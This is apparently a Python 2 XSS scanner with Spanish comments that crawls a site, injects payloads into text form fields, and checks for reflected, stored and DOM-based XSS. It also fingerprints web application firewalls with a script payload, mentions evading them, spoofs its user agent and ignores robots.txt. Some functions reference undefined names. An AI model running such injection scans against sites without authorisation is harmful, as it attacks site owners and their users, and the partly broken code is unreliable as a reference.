import sys
import os
import time
import codecs
import links
import mechanize
import selenium
import re
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoAlertPresentException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys

blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.gif', '.svg',
             '.pdf', '.doc', '.docx', '.zip', '.rar', '.rss']

#payloads = ['<script>alert(1)</script>', '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', 'javascript:alert(1)']

#DOM_FILTER_REGEX = r"(?s)<!--.*?-->|\bescape\([^)]+\)|\([^)]+==[^(]+\)|\"[^\"]+\"|'[^']+'"

re_domxss_sources = re.compile('(location\s*[\[.])|([.\[]\s*["\']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)')
re_domxss_sinks = re.compile('((src|href|data|location|code|value|action)\s*["\'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*["\'\]]*\s*\()')

#TODO singleton

def detectar_WAF():
    noise = "<script>alert()</script>" #a payload which is noisy enough to provoke the WAF
    fuzz = URL.replace("d3v", noise) #Replaces "d3v" in url with noise
    res1 = urlopen(fuzz) #Opens the noise injected payload
    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
        print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True" #A WAF is present
        waf_choice()
    elif res1.code == 999: #if the http response code is 999
        print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 419: #if the http response code is 419
        print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 403: #if the http response code is 403
        print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 302: #if redirection is enabled
        print "\033[1;31m[-]\033[1;m Redirection Detected! Exploitation attempts may fail.\n"
        choice()
    else:
        print "\033[1;32m[+]\033[1;m WAF Status: Offline\n"
        WAF = "False" #No WAF is present
        choice()

def cargar_payloads():
    lista_payloads = []
    try:
        with open('payloads.txt', 'r') as archivo_payloads:
            for linea in archivo_payloads.readlines():
                lista_payloads.append(linea)
                #print linea
    except EnvironmentError, error:
        print error
    finally:
        #print len(lista_payloads)
        return lista_payloads


def detectar_xss_DOM(scripts):
    nro_linea = 0
    for script in scripts:
        for linea in script.split('\n'):
            nro_linea += 1
            patron = re_domxss_sources.search(linea) 
            #for grupo in patron.groups():
            if patron is not None:
                print 'DOM XSS source',linea 
                #os.system('pause')
            patron = re_domxss_sinks.search(linea)
            if patron is not None:
                print 'DOM XSS sink', linea
                #os.system('pause')
    return 0

def detectar_xss_reflejado(br, payload):
    if payload in br.response().read(): #TODO: XSS reflejado
        os.system('pause')
        #br.back()
        return True
    #br.back()
    return False

def detectar_xss_almacenado(driver, parametro, payload):
    #entradas = driver.find_elements_by_xpath("//input") #TODO: tipo de texto
    #entradas = driver.find_elements_by_tag_name('input')
    #print entradas.tag_name, len(entradas)
    #inputElement = driver.find_element_by_id(parametro.id)
    #encontrado = False
    #print str(entradas)#, entradas
        #print driver.current_url
    parametro.send_keys(payload)
    parametro.submit()
    try:
        WebDriverWait(driver, 3).until(EC.alert_is_present(),
                                    'Timed out waiting for PA creation ' +
                                    'confirmation popup to appear.')
        #os.system('pause')
        driver.switch_to.alert.accept()
        print('XSS STORED')
        return True
    #    os.system('pause')
    except NoAlertPresentException:
        return False
    except TimeoutException: #TODO mejorar aca
        return False
    except:
        return False
    finally:
        driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w')
        #driver.execute_script("window.history.go(-1)")
        #return True
def inyectar_payload(br, payload, parametro): #NO hace falta determinar si es get o post.
    br.form[parametro.name] = payload
    br.submit()

def buscar_vulnerabilidad_xss(url_ingresada, lista_payloads, cookies=None):

    for extension in blacklist:
        if extension in url_ingresada:
            return False
    
    #driver = webdriver.Firefox()
    #driver.get(url)
    #if cookies is not None:
    #    driver.manage().addCookie(cookies)
    br = mechanize.Browser(factory=mechanize.RobustFactory())  # factory=mechanize.RobustFactory()
    br.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
    br.set_handle_robots(False)
    br.set_handle_refresh(False)

    driver = webdriver.Firefox()    #PhantomJS 
    driver.get(url_ingresada)
    if cookies is not None:
        driver.manage().addCookie(cookies)
    
    if not links.abrir_url_en_navegador(br, url_ingresada, cookies):
        print "Error al abrir la URL."
        if cookies is not None:
            print "Revise las cookies."
        return False

    i = 0
    forms_y_controles = dict()
    forms = br.forms() 
    for form in forms:     # if a form exists, submit it
        #params = form#list(br.forms())[0]    # our form
        br.select_form(nr=i)    # submit the first form
        controls = form.controls
        for parametro in controls:
            #print str(parametro)
            #par = str(p)
            # submit only those forms which require text
            print parametro.name, parametro.type, parametro.id
            if 'TextControl' in str(parametro) or 'TextareaControl' in str(parametro):
                p = 0
                encontrado = False
                while p < len(lista_payloads) and not encontrado:
                    #print parametro.type
                    #os.system('pause')
                    payload = lista_payloads.pop(p)
                    print payload
                    inyectar_payload(br, payload, parametro)
                    if detectar_xss_reflejado(br, payload):
                        #TODO log, bdd, etc.
                        print "XSS encontrado: ",
                        encontrado = True
                        br.back() #TODO: Ver si srive afuera del if anterior este bloque
                        br.select_form(nr=i)
                        if detectar_xss_reflejado(br, payload):
                            print "Stored"      #XSS encontrado al inyectar payload y luego de esto
                        else:
                            print "Reflejado"   #XSS encontrado solo al inyectar payload 
                    else:
                        try:
                            entrada = driver.find_element_by_id(parametro.id)
                            if detectar_xss_almacenado(driver, entrada, payload):
                                encontrado = True
                        except NoSuchElementException as no_existe_elemento:
                            print no_existe_elemento
                            pass
                        br.back()
                        br.select_form(nr=i)
                        #TODO: setup.py con selenium
                    p += 1
                    #else:
                    #    br.back()
                    #    br.select_form(nr=i)
                        


        i += 1
        #print i
    br.close()
    driver.quit()

if __name__ == '__main__':
    #url = sys.argv[1]
    payloads = cargar_payloads()
    if payloads is None:
        sys.exit('Error al cargar las payloads.Revise el archivo.')
    if payloads == []:
        sys.exit("No se encontraron paylods. Revise el archivo 'payloads.txt' en la carpeta raiz.")
    if not links.es_url_valida(sys.argv[1]): #TODO: chequear url antes de la lista o cuando se va a hacer lo de xss?
        sys.exit("Esquema de URL invalido. Ingrese nuevamente.")
    if not links.se_puede_acceder_a_url(sys.argv[1]):
        sys.exit("No se puede acceder a la URL. Revise la conexion o el sitio web.")
    print sys.argv[1]
    links = links.obtener_links_validos_desde_url(sys.argv[1])
    
    #for url in urls_encontradas:
    for url in links:
        #print url
        link = links[url]
        detectar_xss_DOM(link.scripts)
        buscar_vulnerabilidad_xss(url, payloads)
        

